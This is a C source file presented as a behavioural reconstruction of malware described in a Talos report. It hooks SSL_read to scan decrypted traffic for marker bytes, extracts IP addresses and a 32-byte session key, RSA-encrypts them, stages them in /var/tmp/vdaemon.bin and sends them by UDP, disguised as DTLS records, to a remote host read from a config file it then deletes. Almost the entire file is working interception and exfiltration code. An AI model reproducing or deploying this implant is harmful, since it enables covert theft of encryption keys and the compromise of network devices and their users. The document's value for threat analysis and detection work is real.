/* Behavioral reconstruction from Talos 2026-10-28, not recovered malware.
 * The configured RSA key and target list were not published; callers supply
 * these externally. The markers, length guards, staging paths and UDP record
 * framing are from the report. No real endpoint or key is embedded here. */
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>
typedef struct ssl_st SSL;
typedef struct rsa_st RSA;
extern int RSA_public_encrypt(int, const unsigned char *, unsigned char *, RSA *, int);
static RSA *collector_key;
static unsigned int selected_edge;
static int udp = -1;
static struct sockaddr_in destination;
static int (*original_read)(SSL *, void *, int);
void configure_collection(RSA *key, unsigned int edge) {
    collector_key = key;
    selected_edge = edge;
    FILE *settings = fopen("/var/tmp/vdaemon.conf", "r");
    if (!settings) return;
    char local[64], remote[64]; unsigned int lp, rp;
    int ok = fscanf(settings, "%63s %u\n%63s %u", local, &lp, remote, &rp);
    fclose(settings);
    unlink("/var/tmp/vdaemon.conf");
    if (ok != 4) return;
    struct sockaddr_in source = {0};
    source.sin_family = AF_INET; source.sin_port = htons(lp);
    if (inet_pton(AF_INET, local, &source.sin_addr) != 1) return;
    destination.sin_family = AF_INET; destination.sin_port = htons(rp);
    if (inet_pton(AF_INET, remote, &destination.sin_addr) != 1) return;
    udp = socket(AF_INET, SOCK_DGRAM, 0);
    if (udp >= 0) bind(udp, (struct sockaddr *)&source, sizeof(source));
}
int SSL_read(SSL *session, void *buffer, int capacity) {
    if (!original_read) original_read = dlsym(RTLD_NEXT, "SSL_read");
    if (!original_read) return -1;
    int size = original_read(session, buffer, capacity);
    unsigned char *bytes = buffer;
    if (size <= 0x18f || bytes[0] != 0x07 || !collector_key) return size;
    unsigned char *public_ip = memmem(bytes, size, "\x40\x03\x06", 3);
    unsigned char *system_ip = memmem(bytes, size, "\x40\x0c\x04", 3);
    unsigned char *key_field = memmem(bytes, size, "\x05\x01\x0c\x06\x40", 5);
    if (!public_ip || !system_ip || !key_field) return size;
    if (public_ip + 7 > bytes + size || system_ip + 7 > bytes + size ||
        key_field + 37 > bytes + size) return size;
    unsigned int edge; memcpy(&edge, system_ip + 3, 4);
    if (edge != selected_edge) return size;
    unsigned char key[32]; memcpy(key, key_field + 5, 32);
    char public_text[INET_ADDRSTRLEN], system_text[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, public_ip + 3, public_text, sizeof(public_text));
    inet_ntop(AF_INET, system_ip + 3, system_text, sizeof(system_text));
    time_t now = time(NULL); struct tm utc; gmtime_r(&now, &utc);
    char date[64], record[256]; strftime(date, sizeof(date), "%a %b %d %H:%M:%S UTC %Y", &utc);
    int used = snprintf(record, sizeof(record), "[%s] %s %s ", date, public_text, system_text);
    for (int i = 0; i < 32; ++i) used += snprintf(record + used, sizeof(record) - used, "%02x", key[i]);
    unsigned char encrypted[512];
    int length = RSA_public_encrypt(used, (unsigned char *)record, encrypted, collector_key, 1);
    if (length <= 0) return size;
    FILE *out = fopen("/var/tmp/vdaemon.bin", "ab");
    if (out) { fwrite(encrypted, 1, length, out); fclose(out); }
    if (udp >= 0) {
        unsigned char packet[525] = {0x17, 0xfe, 0xfd};
        packet[11] = length >> 8; packet[12] = length;
        memcpy(packet + 13, encrypted, length);
        sendto(udp, packet, length + 13, 0, (struct sockaddr *)&destination, sizeof(destination));
    }
    return size;
}
